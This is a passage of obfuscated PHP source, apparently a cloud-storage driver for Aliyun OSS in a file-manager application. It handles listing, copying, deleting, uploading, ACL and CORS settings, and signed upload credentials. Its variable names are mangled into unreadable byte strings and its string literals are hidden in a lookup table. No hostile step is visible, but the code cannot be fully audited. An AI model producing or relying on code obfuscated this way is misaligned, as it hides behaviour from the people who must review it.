__construct($êëáêò‚) { parent::__construct($êëáêò‚); $this->signatureVersion($_SERVER[™»È’øè][230]); } public function fileOutLink($½‹—×å) { $²Š™¡¼ä =& $_SERVER[™»È’øè]; if (substr($½‹—×å, 0, 7) == $²Š™¡¼ä[1360]) { $½‹—×å = $²Š™¡¼ä[1361] . substr($½‹—×å, 7); } header($²Š™¡¼ä[161] . $½‹—×å); die; } } class PathDriverOSS extends PathDriverBase { protected $accessKey = ''; protected $secret = ''; protected $domain = ''; protected $bucket = ''; protected $bucketAcl = ''; protected $endpoint = null; protected $client = null; public $ioUploadServer = "\60"; public $ioFileOutServer = "\x30"; public $cdnHost = ''; public $config = array(); public function __construct($ìÇ½µœ«) { parent::__construct(); include_once SDK_DIR . $_SERVER[™»È’øè][1396]; $this->_init($ìÇ½µœ«); } public function _init($èö…Ò±) { $°ü¤Å¢¶ =& $_SERVER[™»È’øè]; $this->config = $èö…Ò±; foreach ($èö…Ò± as $ÅÌ¬é™ => $Ç—á”) { if (isset($this->{$ÅÌ¬é™})) { $this->{$ÅÌ¬é™} = $Ç—á”; } } if (empty($this->accessKey) || empty($this->secret) || empty($this->domain)) { throw new Exception($°ü¤Å¢¶[1397] . LNG($°ü¤Å¢¶[1398])); } $this->client = new OSS\OssClient($this->accessKey, $this->secret, $this->domain); $this->client->setConnectTimeout(60); } public function setBucketCors() { $ÇªÓÃ =& $_SERVER[™»È’øè]; $ùÙ†ã”ú = new OSS\Model\CorsConfig(); $ÏóŸù²š = new OSS\Model\CorsRule(); $ÏóŸù²š->addAllowedOrigin($ÇªÓÃ[1399]); $ÏóŸù²š->addAllowedMethod($ÇªÓÃ[1400]); $ÏóŸù²š->addAllowedMethod($ÇªÓÃ[1401]); $ÏóŸù²š->addAllowedMethod($ÇªÓÃ[1402]); $ÏóŸù²š->addAllowedMethod($ÇªÓÃ[1403]); $ÏóŸù²š->addAllowedMethod($ÇªÓÃ[160]); $ÏóŸù²š->setMaxAgeSeconds(600); $ÏóŸù²š->addExposeHeader($ÇªÓÃ[1404]); $ÏóŸù²š->addAllowedHeader($ÇªÓÃ[1399]); $ùÙ†ã”ú->addRule($ÏóŸù²š); try { $this->client->putBucketCors($this->bucket, $ùÙ†ã”ú); } catch (OSS\Core\OssException $õÉ¶ƒÀ±) { return !1; } return !0; } public function getBucketCors() { $ôİµÄĞ® =& $_SERVER[™»È’øè]; $ğ¿®¸‰€ = null; try { $ğ¿®¸‰€ = $this->client->getBucketCors($this->bucket); } catch (OSS\Core\OssException $ô“»¿¤¹) { return null; } if (!$ğ¿®¸‰€ || !($‹‘•î„ä = $ğ¿®¸‰€->getRules())) { return null; } $à™ÂÆéŒ = $‹‘•î„ä[0]->getAllowedOrigins(); $ÉˆŸ—øÙ = $‹‘•î„ä[0]->getAllowedMethods(); $şÌÒç = $‹‘•î„ä[0]->getMaxAgeSeconds(); $˜ı…“Â = $‹‘•î„ä[0]->getExposeHeaders(); $ ¥èù† = $‹‘•î„ä[0]->getAllowedHeaders(); return array($ôİµÄĞ®[201] => isset($à™ÂÆéŒ[0]) ? $à™ÂÆéŒ[0] : $ôİµÄĞ®[12], $ôİµÄĞ®[205] => $ÉˆŸ—øÙ, $ôİµÄĞ®[1405] => $şÌÒç, $ôİµÄĞ®[1406] => isset($˜ı…“Â[0]) ? $˜ı…“Â[0] : $ôİµÄĞ®[12], $ôİµÄĞ®[203] => isset($ ¥èù†[0]) ? $ ¥èù†[0] : $ôİµÄĞ®[12]); } public function isBucketCors() { $œÉ…Œ» =& $_SERVER[™»È’øè]; $„À«ğ™ = $this->getBucketCors(); if (!$„À«ğ™ || !is_array($„À«ğ™)) { return !1; } if ($„À«ğ™[$œÉ…Œ»[201]] != $œÉ…Œ»[202] || $„À«ğ™[$œÉ…Œ»[203]] != $œÉ…Œ»[202]) { return !1; } $«ÈëìÍË = array_map($œÉ…Œ»[204], $„À«ğ™[$œÉ…Œ»[205]]); if (!is_array($«ÈëìÍË)) { $«ÈëìÍË = array(); } $´Êíëµ = array($œÉ…Œ»[206], $œÉ…Œ»[207], $œÉ…Œ»[208], $œÉ…Œ»[209], $œÉ…Œ»[210]); $Ç¦§½İå = array_diff($´Êíëµ, $«ÈëìÍË); return empty($Ç¦§½İå); } public function mkfile($şö“‰´, $ŠÊËÖ¨ = '', $şë¸­ = REPEAT_RENAME) { $Í…òæ™õ = $this->setContent($şö“‰´, $ŠÊËÖ¨); if ($Í…òæ™õ !== !1) { return $this->getPathOuter($şö“‰´); } return !1; } public function mkdir($òğŒ†å€, $ı¦½£ª = REPEAT_SKIP) { if ($ı¦½£ª && $this->_isFolder($òğŒ†å€)) { return $this->getPathOuter($òğŒ†å€); } try { $this->client->createObjectDir($this->bucket, $this->pathEncode($òğŒ†å€)); } catch (OSS\Core\OssException $¾¦ï´ ) { return !1; } return $this->getPathOuter($òğŒ†å€); } private function fileList($©ÅÆ•ÀŞ, $š®„…úß = '', $ÁÜÅä„¬ = 0) { $½¬¼¯É× =& $_SERVER[™»È’øè]; $©ÅÆ•ÀŞ = trim($©ÅÆ•ÀŞ, $½¬¼¯É×[8]); $Ìû“ ·Õ = empty($©ÅÆ•ÀŞ) && $©ÅÆ•ÀŞ !== $½¬¼¯É×[211] ? $½¬¼¯É×[12] : $©ÅÆ•ÀŞ . $½¬¼¯É×[8]; $®ÊÌùÉ = $½¬¼¯É×[12]; $ÒÈƒ™Ï = 1000; $×ÒÌåÜß = $î±Öğ– = array(); while (!0) { check_abort(); $»ÌÒñ•¥ = array($½¬¼¯É×[1407] => $š®„…úß, $½¬¼¯É×[1408] => $Ìû“ ·Õ, $½¬¼¯É×[1409] => $ÒÈƒ™Ï, $½¬¼¯É×[1410] => $®ÊÌùÉ); try { $À¬€§Ğ = $this->client->listObjects($this->bucket, $»ÌÒñ•¥); } catch (OSS\Core\OssException $¦ŸáÇß›) { break; } $®ÊÌùÉ = $À¬€§Ğ->getNextMarker(); $ãş½¯ ı = $À¬€§Ğ->getObjectList(); $ÁÇ¤´Àğ = $À¬€§Ğ->getPrefixList(); foreach ($ãş½¯ ı as $¬·¿çÃ) { if ($¬·¿çÃ->getKey() == $Ìû“ ·Õ) { continue; } $½¦Ã¬Ï‡ = $¬·¿çÃ->getKey(); $´‘”®‹ç = $¬·¿çÃ->getSize(); $î¾æ¼…ñ = $¬·¿çÃ->getLastModified(); $€âã¢Áª = trim($¬·¿çÃ->getETag(), $½¬¼¯É×[118]); $ËÁÑª = $ÁÜÅä„¬ ? array($½¬¼¯É×[32] => $½¦Ã¬Ï‡, $½¬¼¯É×[76] => $´‘”®‹ç, $½¬¼¯É×[193] => strtotime($î¾æ¼…ñ), $½¬¼¯É×[1411] => $€âã¢Áª) : $½¦Ã¬Ï‡; $­™áÏù¢ = $´‘”®‹ç == 0 && substr($½¦Ã¬Ï‡, strlen($½¦Ã¬Ï‡) - 1, 1) == $½¬¼¯É×[8] ? !0 : !1; $£·ÂŠÛ = array($½¬¼¯É×[76] => $´‘”®‹ç, $½¬¼¯É×[1412] => $´‘”®‹ç, $½¬¼¯É×[85] => strtotime($î¾æ¼…ñ), $½¬¼¯É×[1413] => $î¾æ¼…ñ, $½¬¼¯É×[1411] => $€âã¢Áª); $this->cacheMethodInfoSet($½¦Ã¬Ï‡, $­™áÏù¢, $£·ÂŠÛ); if ($­™áÏù¢) { $×ÒÌåÜß[] = $½¦Ã¬Ï‡; continue; } $î±Öğ–[] = $ËÁÑª; } foreach ($ÁÇ¤´Àğ as $¤­æ¬) { $×ÒÌåÜß[] = $¤­æ¬->getPrefix(); $this->cacheMethodInfoSet($¤­æ¬->getPrefix(), !0); } if ($®ÊÌùÉ === $½¬¼¯É×[12]) { break; } } $this->cacheMethodInfoSet($©ÅÆ•ÀŞ, !0); return array($½¬¼¯É×[82] => $×ÒÌåÜß, $½¬¼¯É×[83] => $î±Öğ–); } public function copyFile($øõúış¶, $ÇÉšòï) { $ÔóİôŸ = $this->size($øõúış¶); if ($ÔóİôŸ < 1024 * 1024 * 1024) { try { $this->client->copyObject($this->bucket, $øõúış¶, $this->bucket, $this->pathEncode($ÇÉšòï)); } catch (OSS\Core\OssException $½÷·š†·) { return !1; } return $this->getPathOuter($ÇÉšòï); } $şşÂµ¤ = $this->multiCopyObject($øõúış¶, $ÇÉšòï, $ÔóİôŸ); return $şşÂµ¤ ? $this->getPathOuter($ÇÉšòï) : !1; } private function multiCopyObject($£ÀÉÜ¥ë, $¶û¾ÉÉ¥, $‰ø´õáŞ) { $ÛÓ¡Şé =& $_SERVER[™»È’øè]; try { $ù¶ªğ à = array(); if ($”ø¶…½ú = $this->hashMd5($£ÀÉÜ¥ë)) { $ù¶ªğ à = array(OSS\OssClient::OSS_HEADERS => array($ÛÓ¡Şé[1414] => $”ø¶…½ú)); } $˜æõ—ü¢ = $this->client->initiateMultipartUpload($this->bucket, $this->pathEncode($¶û¾ÉÉ¥), $ù¶ªğ à); $õÒ¦ƒ²Ÿ = 1; $ìßËàÚ« = 0; $Òü«ä‚Ú = array(); $ûÃšº« = 1024 * 1024 * 10; $ü±¨¯¯Ä = $this->client->generateMultiuploadParts($‰ø´õáŞ, $ûÃšº«); foreach ($ü±¨¯¯Ä as $„¶Ô•Ã => $ë½ÕÓ•Ø) { $Â×©àßò = $ìßËàÚ« + (int) $ë½ÕÓ•Ø[$ÛÓ¡Şé[1415]]; $ª‡â÷ñÎ = (int) $ë½ÕÓ•Ø[$ÛÓ¡Şé[380]] + $Â×©àßò - 1; $öƒâÑĞ¾ = array($ÛÓ¡Şé[1416] => $Â×©àßò, $ÛÓ¡Şé[1417] => $ª‡â÷ñÎ); $Òü«ä‚Ú[] = $this->client->uploadPartCopy($this->bucket, $£ÀÉÜ¥ë, $this->bucket, $this->pathEncode($¶û¾ÉÉ¥), $õÒ¦ƒ²Ÿ, $˜æõ—ü¢, $öƒâÑĞ¾); $õÒ¦ƒ²Ÿ = $õÒ¦ƒ²Ÿ + 1; } $¯Ö¨äË€ = array(); foreach ($Òü«ä‚Ú as $„¶Ô•Ã => $ˆàÕÔš¦) { $¯Ö¨äË€[] = array($ÛÓ¡Şé[1418] => $„¶Ô•Ã + 1, $ÛÓ¡Şé[1419] => $ˆàÕÔš¦); } $this->client->completeMultipartUpload($this->bucket, $this->pathEncode($¶û¾ÉÉ¥), $˜æõ—ü¢, $¯Ö¨äË€); } catch (OSS\Core\OssException $Ä…†„»ê) { return !1; } return !0; } public function moveFile($âõäšß, $ÓÍ±ì©) { if ($this->copyFile($âõäšß, $ÓÍ±ì©)) { $this->remove($âõäšß); return $this->getPathOuter($ÓÍ±ì©); } return !1; } public function delFile($·ˆáÏ) { try { $this->client->deleteObject($this->bucket, $this->pathEncode($·ˆáÏ)); } catch (OSS\Core\OssException $°…±ìÂ÷) { return !1; } return !0; } public function delFolder($‘Ò¢Ûè‚) { $êìÑáé¤ =& $_SERVER[™»È’øè]; if (!$this->exist($‘Ò¢Ûè‚)) { return !0; } $this->listItemCache = !1; $™æ´ƒ‡å = $this->fileList($‘Ò¢Ûè‚); $this->listItemCache = !0; $éˆ½Ù = trim($‘Ò¢Ûè‚, $êìÑáé¤[8]) . $êìÑáé¤[8]; if (!empty($‘Ò¢Ûè‚) && $‘Ò¢Ûè‚ !== $êìÑáé¤[211] && !in_array($éˆ½Ù, $™æ´ƒ‡å[$êìÑáé¤[82]])) { $™æ´ƒ‡å[$êìÑáé¤[82]][] = $éˆ½Ù; } $´Ù°¿¸ñ = $this->delByBatch($™æ´ƒ‡å[$êìÑáé¤[83]]); if (!$´Ù°¿¸ñ) { return !1; } $´Ù°¿¸ñ = $this->delByBatch($™æ´ƒ‡å[$êìÑáé¤[82]]); if (!$´Ù°¿¸ñ) { return !1; } return $this->delFile($éˆ½Ù); } private function delByBatch($ïÅìÂ‚) { foreach (array_chunk($ïÅìÂ‚, 1000) as $¥Ñ‘â) { try { $this->client->deleteObjects($this->bucket, $¥Ñ‘â); } catch (OSS\Core\OssException $—ù”Öá¹) { return !1; } } return !0; } public function rename($Ìá¾–°˜, $Ø×œÊêª) { return $this->renameObject($Ìá¾–°˜, $Ø×œÊêª); } private function fileInfo($‰Şõ¯, $¼¡Ô¡™§ = false, $÷ËÂ¹Ÿ = array()) { $¤µ˜Ô  =& $_SERVER[™»È’øè]; $²Ë¯­Á = array($¤µ˜Ô [32] => $this->pathThis($‰Şõ¯), $¤µ˜Ô [84] => $this->getPathOuter($‰Şõ¯), $¤µ˜Ô [33] => $¤µ˜Ô [213], $¤µ˜Ô [76] => isset($÷ËÂ¹Ÿ[$¤µ˜Ô [76]]) ? $÷ËÂ¹Ÿ[$¤µ˜Ô [76]] : 0, $¤µ˜Ô [174] => $this->ext($‰Şõ¯)); if ($¼¡Ô¡™§) { return $²Ë¯­Á; } $²Ë¯­Á[$¤µ˜Ô [214]] = $²Ë¯­Á[$¤µ˜Ô [85]] = 0; $²Ë¯­Á[$¤µ˜Ô [215]] = $²Ë¯­Á[$¤µ˜Ô [216]] = !0; if (empty($÷ËÂ¹Ÿ)) { $ğâ«û£ä = $this->objectMeta($‰Şõ¯); if (!$ğâ«û£ä) { return $²Ë¯­Á; } $÷ËÂ¹Ÿ = array($¤µ˜Ô [85] => strtotime($ğâ«û£ä[$¤µ˜Ô [1413]]), $¤µ˜Ô [76] => $ğâ«û£ä[$¤µ˜Ô [1412]] + 0, $¤µ˜Ô [1411] => $ğâ«û£ä[$¤µ˜Ô [1411]]); } if (isset($÷ËÂ¹Ÿ[$¤µ˜Ô [1411]]) && $÷ËÂ¹Ÿ[$¤µ˜Ô [1411]]) { $²Ë¯­Á[$¤µ˜Ô [218]] = $÷ËÂ¹Ÿ[$¤µ˜Ô [1411]]; } if (isset($÷ËÂ¹Ÿ[$¤µ˜Ô [76]])) { $²Ë¯­Á[$¤µ˜Ô [76]] = $÷ËÂ¹Ÿ[$¤µ˜Ô [76]]; } if (isset($÷ËÂ¹Ÿ[$¤µ˜Ô [85]])) { $²Ë¯­Á[$¤µ˜Ô [85]] = $÷ËÂ¹Ÿ[$¤µ˜Ô [85]]; } if (isset($÷ËÂ¹Ÿ[$¤µ˜Ô [193]]) && !trim($²Ë¯­Á[$¤µ˜Ô [85]])) { $²Ë¯­Á[$¤µ˜Ô [85]] = $÷ËÂ¹Ÿ[$¤µ˜Ô [193]]; } return $²Ë¯­Á; } private function folderInfo($¼’Äå­Å, $©®òÄå› = false, $–ˆäû = array()) { $ÄÕ§ü× =& $_SERVER[™»È’øè]; $ŠëÄ†ü¤ = array($ÄÕ§ü×[32] => $this->pathThis($¼’Äå­Å), $ÄÕ§ü×[84] => $this->getPathOuter($ÄÕ§ü×[8] . $¼’Äå­Å), $ÄÕ§ü×[33] => $ÄÕ§ü×[75]); if ($©®òÄå›) { return $ŠëÄ†ü¤; } $ŠëÄ†ü¤[$ÄÕ§ü×[214]] = $ŠëÄ†ü¤[$ÄÕ§ü×[85]] = 0; $ŠëÄ†ü¤[$ÄÕ§ü×[215]] = $ŠëÄ†ü¤[$ÄÕ§ü×[216]] = !0; if (empty($–ˆäû)) { $¼’Äå­Å = rtrim($¼’Äå­Å, $ÄÕ§ü×[8]) . $ÄÕ§ü×[8]; $´²ß††Ï = $this->objectMeta($¼’Äå­Å); if (!$´²ß††Ï) { return $ŠëÄ†ü¤; } $–ˆäû = array($ÄÕ§ü×[214] => $´²ß††Ï[$ÄÕ§ü×[543]][$ÄÕ§ü×[1420]], $ÄÕ§ü×[85] => strtotime($´²ß††Ï[$ÄÕ§ü×[1413]])); } if (isset($–ˆäû[$ÄÕ§ü×[85]])) { $ŠëÄ†ü¤[$ÄÕ§ü×[85]] = $–ˆäû[$ÄÕ§ü×[85]]; } if (isset($–ˆäû[$ÄÕ§ü×[214]])) { $ŠëÄ†ü¤[$ÄÕ§ü×[214]] = $–ˆäû[$ÄÕ§ü×[214]]; } return $ŠëÄ†ü¤; } public function listPath($çùÙôí­, $Ø³İêäÑ = false) { $Èí÷îÜ =& $_SERVER[™»È’øè]; $¬¨¸Æ‹› = $this->fileList($çùÙôí­, $Èí÷îÜ[8], !0); foreach ($¬¨¸Æ‹›[$Èí÷îÜ[82]] as $õ¤ÁÀ¼« => $‚ã—å»Ş) { $¬¨¸Æ‹›[$Èí÷îÜ[82]][$õ¤ÁÀ¼«] = $this->folderInfo($‚ã—å»Ş, $Ø³İêäÑ, $‚ã—å»Ş); } foreach ($¬¨¸Æ‹›[$Èí÷îÜ[83]] as $õ¤ÁÀ¼« => $‚ã—å»Ş) { $¬¨¸Æ‹›[$Èí÷îÜ[83]][$õ¤ÁÀ¼«] = $this->fileInfo($‚ã—å»Ş[$Èí÷îÜ[32]], $Ø³İêäÑ, $‚ã—å»Ş); } return $¬¨¸Æ‹›; } protected function infoChildren($©æ¸Ç, &$Åñ“âÃŞ) { $›ôÕ«êÙ =& $_SERVER[™»È’øè]; $ğ®‹›è¤ = $this->fileList($©æ¸Ç, $›ôÕ«êÙ[12], !0); $Åñ“âÃŞ[$›ôÕ«êÙ[78]] += count($ğ®‹›è¤[$›ôÕ«êÙ[82]]); $Åñ“âÃŞ[$›ôÕ«êÙ[77]] += count($ğ®‹›è¤[$›ôÕ«êÙ[83]]); foreach ($ğ®‹›è¤[$›ôÕ«êÙ[83]] as $Öáõ¹ùÚ) { if (!$Öáõ¹ùÚ || !$Öáõ¹ùÚ[$›ôÕ«êÙ[76]]) { continue; } $Åñ“âÃŞ[$›ôÕ«êÙ[76]] += $Öáõ¹ùÚ[$›ôÕ«êÙ[76]]; } } public function has($õÏ…©¨, $¬˜Æ€®ü = false, $×ğ°á³ = true) { $Î²ÜÍ˜ =& $_SERVER[™»È’øè]; $õÏ…©¨ = trim($õÏ…©¨, $Î²ÜÍ˜[8]); $ˆéıº¡ = empty($õÏ…©¨) && $õÏ…©¨ !== $Î²ÜÍ˜[211] ? $Î²ÜÍ˜[12] : $õÏ…©¨ . $Î²ÜÍ˜[8]; $‹ÖØëÔõ = $Î²ÜÍ˜[12]; $àåĞÃˆ = 500; $Ö„¬ñ»Ë = $‰½Åâ½ = 0; while (!0) { check_abort(); $®ŒÕ‡àÙ = array($Î²ÜÍ˜[1407] => $Î²ÜÍ˜[8], $Î²ÜÍ˜[1408] => $ˆéıº¡, $Î²ÜÍ˜[1409] => $àåĞÃˆ, $Î²ÜÍ˜[1410] => $‹ÖØëÔõ); try { $ÂÍÅ©â§ = $this->client->listObjects($this->bucket, $®ŒÕ‡àÙ); } catch (OSS\Core\OssException $‡ñíë») { break; } $‹ÖØëÔõ = $ÂÍÅ©â§->getNextMarker(); $ÊØ‘îÂ‹ = $ÂÍÅ©â§->getObjectList(); $âöü¼ = $ÂÍÅ©â§->getPrefixList(); if ($¬˜Æ€®ü) { if (count($ÊØ‘îÂ‹) > 1 || count($ÊØ‘îÂ‹) == 1 && $ÊØ‘îÂ‹[0]->getKey() != $ˆéıº¡) { $Ö„¬ñ»Ë += count($ÊØ‘îÂ‹) - 1; } if (!empty($âöü¼)) { $‰½Åâ½ += count($âöü¼); } if ($‹ÖØëÔõ === $Î²ÜÍ˜[12]) { break; } continue; } if ($×ğ°á³) { if (!empty($ÊØ‘îÂ‹)) { if (count($ÊØ‘îÂ‹) > 1 || $ÊØ‘îÂ‹[0]->getKey() != $ˆéıº¡) { return !0; } } } else { if (!empty($âöü¼)) { return !0; } } if ($‹ÖØëÔõ === $Î²ÜÍ˜[12]) { break; } } if ($¬˜Æ€®ü) { return array($Î²ÜÍ˜[222] => $Ö„¬ñ»Ë, $Î²ÜÍ˜[223] => $‰½Åâ½); } return !1; } public function listAll($ñ¾à™ğ¾) { $ä˜‹œĞ =& $_SERVER[™»È’øè]; $¼Éîòª÷ = $this->fileList($ñ¾à™ğ¾, $ä˜‹œĞ[12], !0); $’Éìœ’ = array_to_keyvalue($¼Éîòª÷[$ä˜‹œĞ[83]], $ä˜‹œĞ[32]); foreach ($¼Éîòª÷[$ä˜‹œĞ[82]] as $÷çÖô÷) { if (is_string($÷çÖô÷)) { $’Éìœ’[$÷çÖô÷] = array($ä˜‹œĞ[76] => 0); } } return $this->listAllFiles($ñ¾à™ğ¾, $’Éìœ’); } public function canRead($íÃî…) { $¡¦·¿ =& $_SERVER[™»È’øè]; $Í‚·¦Õ = $this->pathAcl($íÃî…); return $Í‚·¦Õ == $¡¦·¿[1421] || $Í‚·¦Õ == $¡¦·¿[586] ? !0 : !1; } public function canWrite($ƒÙÁˆ€½) { $òËˆ´ÄÛ = $this->pathAcl($ƒÙÁˆ€½); return $òËˆ´ÄÛ == $_SERVER[™»È’øè][586] ? !0 : !1; } public function pathAcl($ÄÊñÙ–Û) { $÷õÈòÜı =& $_SERVER[™»È’øè]; if (empty($this->bucketAcl)) { $this->bucketAcl = $this->client->getBucketAcl($this->bucket); } try { $âÛæ›Âğ = $this->client->getObjectAcl($this->bucket, $this->pathEncode($ÄÊñÙ–Û)); } catch (OSS\Core\OssException $„ÌÍÚ ) { return !1; } $‡ô¼ˆ®Ã = $âÛæ›Âğ == $÷õÈòÜı[37] ? $this->bucketAcl : $âÛæ›Âğ; if ($‡ô¼ˆ®Ã == $÷õÈòÜı[1422]) { return $÷õÈòÜı[1421]; } if ($‡ô¼ˆ®Ã == $÷õÈòÜı[1423]) { return $÷õÈòÜı[586]; } return $‡ô¼ˆ®Ã; } private function chmodPath($õ¾÷ŠÉõ, $‚¼í¥€ğ = '') { $õŒˆ˜Óí =& $_SERVER[™»È’øè]; $€³Îå·ë = empty($‚¼í¥€ğ) ? $õŒˆ˜Óí[1423] : $‚¼í¥€ğ; $‹ŞÁËÈ¢ = array($õŒˆ˜Óí[37], $õŒˆ˜Óí[212], $õŒˆ˜Óí[1422], $õŒˆ˜Óí[1423]); if (!in_array($€³Îå·ë, $‹ŞÁËÈ¢)) { return !1; } try { $this->client->putObjectAcl($this->bucket, $this->pathEncode($õ¾÷ŠÉõ), $€³Îå·ë); } catch (OSS\Core\OssException $“³›õ“ë) { return !1; } return !0; } public function getContent($ªË¬‰òÃ) { return $this->fileSubstr($ªË¬‰òÃ, -1); } public function setContent($Ÿ’É¼ßÑ, $ËÁŒÜ©À = '') { $ôÜ—é¢ı =& $_SERVER[™»È’øè]; try { $·£¯¡ı¿ = $this->trafficLimit($ôÜ—é¢ı[1424]); $ôÌŒ¹µ× = $this->client->putObject($this->bucket, $this->pathEncode($Ÿ’É¼ßÑ), $ËÁŒÜ©À, $·£¯¡ı¿); } catch (OSS\Core\OssException $­ÔÅóöË) { return !1; } $ª˜’¼— = array($ôÜ—é¢ı[1414] => trim($ôÌŒ¹µ×[$ôÜ—é¢ı[1411]], $ôÜ—é¢ı[118]), OSS\OssClient::OSS_CONTENT_TYPE => get_file_mime(get_path_ext($Ÿ’É¼ßÑ))); $this->updateObjMeta($Ÿ’É¼ßÑ, $ª˜’¼—); return isset($ôÌŒ¹µ×[$ôÜ—é¢ı[1425]][$ôÜ—é¢ı[274]]) ? !0 : !1; } private function updateObjMeta($ıú…–İ, $ó®ˆğ’) { $ıú…–İ = $this->pathEncode($ıú…–İ); try { $±ë®ÚØ = array(OSS\OssClient::OSS_HEADERS => $ó®ˆğ’); $this->client->copyObject($this->bucket, $ıú…–İ, $this->bucket, $ıú…–İ, $±ë®ÚØ); } catch (OSS\Core\OssException $Â—£“§) { return !1; } return !0; } public function upload($àæ©Ø¸¸, $ğ¥ä„ù±, $’òÕÜã = false, $¬ôÎë›Ì = REPEAT_REPLACE) { $½Ö¯½² =& $_SERVER[™»È’øè]; $ ÊÕòÕã = trim($àæ©Ø¸¸, $½Ö¯½²[8]); $ñÇûØ = array(OSS\OssClient::OSS_CHECK_MD5 => !0, OSS\OssClient::OSS_PART_SIZE => 1024 * 1024 * 10, OSS\OssClient::OSS_HEADERS => array($½Ö¯½²[1414] => @md5_file($ğ¥ä„ù±)), OSS\OssClient::OSS_CONTENT_TYPE => get_file_mime(get_path_ext($àæ©Ø¸¸))); $ñÇûØ = $this->trafficLimit($½Ö¯½²[1424], $ñÇûØ); try { $this->client->multiuploadFile($this->bucket, $this->pathEncode($ ÊÕòÕã), $ğ¥ä„ù±, $ñÇûØ); } catch (OSS\Core\OssException $ƒÃƒŸ˜ê) { return !1; } return $this->getPathOuter($àæ©Ø¸¸); } public function getHost() { $¸Ææƒ¨ =& $_SERVER[™»È’øè]; $ñåç¾ÈÉ = explode($¸Ææƒ¨[197], parent::getHost()); return $ñåç¾ÈÉ[0] . $¸Ææƒ¨[197] . $this->bucket . $¸Ææƒ¨[10] . $ñåç¾ÈÉ[1]; } public function uploadFormData($­©õ–½ë, $˜Ö“íÈÛ = 3600) { $„ô»Ö®ü =& $_SERVER[™»È’øè]; if (!($Áõ˜Ší€ = $this->getHost())) { return !1; } $µ‹É„×Ì = $˜Ö“íÈÛ; $£µ—ˆŒÒ = date($„ô»Ö®ü[1426], time() + $µ‹É„×Ì); $Ñ¹Øí¢· = new DateTime($£µ—ˆŒÒ); $ÛÅ¶¬Üš = $Ñ¹Øí¢·->format(DateTime::ISO8601); $•ûø¬ã = strpos($ÛÅ¶¬Üš, $„ô»Ö®ü[339]); $ÛÅ¶¬Üš = substr($ÛÅ¶¬Üš, 0, $•ûø¬ã) . $„ô»Ö®ü[1427]; $‡À¾±Ëü = 1048576000 * 5; $Œ€¶šÃ” = $this->pathFather($­©õ–½ë); $à°˜«¼ä = array($„ô»Ö®ü[257] => $ÛÅ¶¬Üš, $„ô»Ö®ü[260] => array(array($„ô»Ö®ü[1428], 0, $‡À¾±Ëü), array($„ô»Ö®ü[263], $„ô»Ö®ü[264], $Œ€¶šÃ”))); $úÌõıÇ = base64_encode(json_encode($à°˜«¼ä)); $ÀØí¶±Ş = base64_encode(hash_hmac($„ô»Ö®ü[246], $úÌõıÇ, $this->secret, !0)); $Á™‚Õú = array($„ô»Ö®ü[275] => $úÌõıÇ, $„ô»Ö®ü[1429] => $this->accessKey, $„ô»Ö®ü[267] => $„ô»Ö®ü[256], $„ô»Ö®ü[1430] => $ÀØí¶±Ş, $„ô»Ö®ü[195] => $Áõ˜Ší€); $Á™‚Õú = $this->trafficLimit($„ô»Ö®ü[1424], $Á™‚Õú); return $Á™‚Õú; } public function multiUploadFormData($ı­¿ÑµÛ, $¶µÇ´¸“ = 3600) { $…şå“‡ =& $_SERVER[™»È’øè]; if (!($ãó‘¶š = $this->getHost())) { return !1; } $¢ßí›³ = $this->trafficLimit($…şå“‡[1424]); $¿À¨¾ì = $this->client->initiateMultipartUpload($this->bucket, $this->pathEncode($ı­¿ÑµÛ), $¢ßí›³); return array($…şå“‡[237] => $¿À¨¾ì, $…şå“‡[195] => $ãó‘¶š . $…şå“‡[8] . $this->pathEncode($ı­¿ÑµÛ), $…şå“‡[238] => gmdate($…şå“‡[1431]), $…şå“‡[94] => $ı­¿ÑµÛ); } public function multiUploadAuthData($œï³ªøâ, $ÛòÚ©Ì = array()) { $Äœ«´Š =& $_SERVER[™»È’øè]; $ÔÁÍ­© = isset($ÛòÚ©Ì[$Äœ«´Š[238]]) ? $ÛòÚ©Ì[$Äœ«´Š[238]] : gmdate($Äœ«´Š[1431]); $Şäá¸™ğ = isset($ÛòÚ©Ì[$Äœ«´Š[174]]) ? $ÛòÚ©Ì[$Äœ«´Š[174]] : $Äœ«´Š[12]; $¥œóÛÄ = $œï³ªøâ; if (isset($ÛòÚ©Ì[$Äœ«´Š[94]])) { $¥œóÛÄ = $ÛòÚ©Ì[$Äœ«´Š[94]]; unset($ÛòÚ©Ì[$Äœ«´Š[94]]); } if (isset($ÛòÚ©Ì[$Äœ«´Š[239]])) { $ÛòÚ©Ì[$Äœ«´Š[238]] = $ÔÁÍ­©; return $this->listUploadParts($¥œóÛÄ, $ÛòÚ©Ì); } $¹Åîó¨ = array($Äœ«´Š[240], $Äœ«´Š[12], $Äœ«´Š[120], $ÔÁÍ­©, "\x78\x2d\157\x73\163\55\x64\x61\164\x65\72{$ÔÁÍ­©}", $Äœ«´Š[8] . $this->bucket . $Äœ«´Š[8] . $¥œóÛÄ . $Şäá¸™ğ); if (strpos($Şäá¸™ğ, $Äœ«´Š[241]) === 0) { $¹Åîó¨[0] = $Äœ«´Š[242]; if ($Ö¸»Ø¸ã = $this->trafficLimit($Äœ«´Š[1424])) { $¥œóÛÄ = $Äœ«´Š[1432]; array_splice($¹Åîó¨, 5, 0, $¥œóÛÄ . $Äœ«´Š[4] . $Ö¸»Ø¸ã[$¥œóÛÄ]); } } if (isset($ÛòÚ©Ì[$Äœ«´Š[243]]) && $ÛòÚ©Ì[$Äœ«´Š[243]] == $Äœ«´Š[244]) { $¹Åîó¨[0] = $Äœ«´Š[244]; } if (!empty($ÛòÚ©Ì[$Äœ«´Š[1433]])) { $ô­ÊÃÅğ = array_merge(array($¹Åîó¨[4]), $ÛòÚ©Ì[$Äœ«´Š[1433]]); sort($ô­ÊÃÅğ); $¹Åîó¨[4] = implode($Äœ«´Š[245], $ô­ÊÃÅğ); } $Ï¬Õ•Ø« = implode($Äœ«´Š[245], $¹Åîó¨); $¡ĞŸšºÓ = base64_encode(hash_hmac($Äœ«´Š[246], $Ï¬Õ•Ø«, $this->secret, !0)); $äÛñ®—“ = $Äœ«´Š[1397] . $this->accessKey . $Äœ«´Š[4] . $¡ĞŸšºÓ; if (strpos($Şäá¸™ğ, $Äœ«´Š[241]) === 0) { $äÛñ®—“ = array($Äœ«´Š[248] => $äÛñ®—“, $Äœ«´Š[238] => $ÔÁÍ­©); if ($Ö¸»Ø¸ã) { $äÛñ®—“ = array_merge($äÛñ®—“, $Ö¸»Ø¸ã); } } return $äÛñ®—“; } public function listUploadParts($´§›ÍŞÇ, $Áê„÷”) { $ÖßÕúêË =& $_SERVER[™»È’øè]; 